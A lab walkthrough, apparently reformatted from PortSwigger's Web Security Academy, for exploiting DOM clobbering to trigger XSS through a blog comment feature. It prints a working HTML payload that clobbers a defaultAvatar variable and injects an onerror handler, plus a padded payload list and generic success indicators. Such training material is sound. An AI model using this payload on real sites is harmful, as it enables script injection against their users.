## Exploiting DOM clobbering to enable XSS

**Category:** xss_dom
**Difficulty:** Unknown

### Description
This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call thealert()function.

### Solution Steps
1. Go to one of the blog posts and create a comment containing the following anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
2. Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called.

### Key Payloads
- `alert()`
- `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
- `loadCommentsWithDomClobbering.js`
- `let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`
- `defaultAvatar`
- `name`
- `"avatar"`
- `avatar`
- `href`
- `cid:`

### Indicators of Success
- DOM sink receives tainted source data
- JavaScript executes via DOM manipulation
- URL fragment or hash value exploited
- postMessage handler vulnerable
- Client-side code processes attacker input
---
*Source: PortSwigger Web Security Academy*
